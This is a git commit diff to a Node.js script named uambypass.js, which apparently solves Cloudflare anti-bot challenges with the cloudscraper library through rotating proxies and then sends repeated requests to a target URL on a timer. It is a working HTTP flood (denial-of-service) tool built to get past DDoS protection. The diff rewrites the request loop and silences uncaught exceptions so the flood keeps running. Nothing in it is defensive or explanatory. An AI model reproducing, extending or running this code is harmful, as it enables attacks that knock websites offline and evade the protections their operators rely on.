f27c09223e141eab9a0befb7b6fef13c58d4fc4d
Nhandz-ai <nguyentruongnhan20072013@gmail.com>
2025-11-20 01:46:20 +0700

    Update uambypass.js

--- data/uambypass.js
+++ data/uambypass.js
@@ -1,8 +1,7 @@
-Require('events').EventEmitter.defaultMaxListeners = 0;
+require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs'),
-    CloudScraper = require('cloudscraper'), 
+    CloudScraper = require('cloudscraper'),
     path = require('path');
-
 
 if (process.argv.length !== 6) {
     console.log(`
@@ -17,52 +16,42 @@ const target = process.argv[2],
 
 let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 
-let getHeaders = async function () {
+function send_req() {
     let proxy = proxies[Math.floor(Math.random() * proxies.length)];
 
-    try {
-        const response = await CloudScraper({
+    let getHeaders = new Promise(function (resolve, reject) {
+        CloudScraper({
             uri: target,
             resolveWithFullResponse: true,
             proxy: 'http://' + proxy,
             challengesToSolve: 10
-        });
-
-        return response.request.headers; 
-
-    } catch (error) {
-        let obj_v = proxies.indexOf(proxy);
-        if (obj_v !== -1) {
-            proxies.splice(obj_v, 1);
-        }
-        console.log(error.message);
-        
-        throw error;
-    }
-};
-
-async function send_req() {
-    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
-
-    try {
-        const headers = await getHeaders(); 
-        
-        for (let i = 0; i < req_per_ip; ++i) {
-            try {
-                await CloudScraper({
-                    uri: target,
-                    headers: headers,
-                    proxy: 'http://' + proxy,
-                    followAllRedirects: false
-                });
-            } catch (error) {
-                console.log(error.message);
+        }, function (error, response) {
+            if (error) {
+                let obj_v = proxies.indexOf(proxy);
+                proxies.splice(obj_v, 1);
+                return console.log(error.message);
             }
-        }
+            resolve(response.request.headers);
+        });
+    });
 
-    } catch (error) {
-        
-    }
+    getHeaders.then(function (result) {
+        // Object.keys(result).forEach(function (i, e) {
+        //     console.log(i + ': ' + result[i]);
+        // });
+        for (let i = 0; i < req_per_ip; ++i) {
+            CloudScraper({
+                uri: target,
+                headers: result,
+                proxy: 'http://' + proxy,
+                followAllRedirects: false
+            }, function (error, response) {
+                if (error) {
+                    console.log(error.message);
+                }
+            });
+        }
+    });
 }
 
 setInterval(() => {
@@ -74,9 +63,10 @@ setTimeout(() => {
     process.exit(0)
 }, time * 1000);
 
+// to avoid errors
 process.on('uncaughtException', function (err) {
-    
+    // console.log(err);
 });
 process.on('unhandledRejection', function (err) {
-    
+    // console.log(err);
 });
